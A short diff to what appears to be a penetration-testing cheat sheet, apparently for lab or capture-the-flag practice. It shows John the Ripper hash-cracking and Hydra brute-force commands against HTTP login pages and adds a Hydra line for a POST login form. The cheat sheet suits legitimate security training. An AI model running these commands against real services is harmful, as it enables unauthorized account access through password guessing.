@@ -120,6 +120,8 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
 ```
 hydra -l bob -P WORDLIST -t 1 -f HOSTNAME http-get /DIR/
 hydra -l bob -P /usr/share/wordlists/rockyou.txt -t 1 -f 10.10.2.215 http-get /protected/
+
+hydra -l <username> -P <password list> <ip> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
 ## nikto
 ```
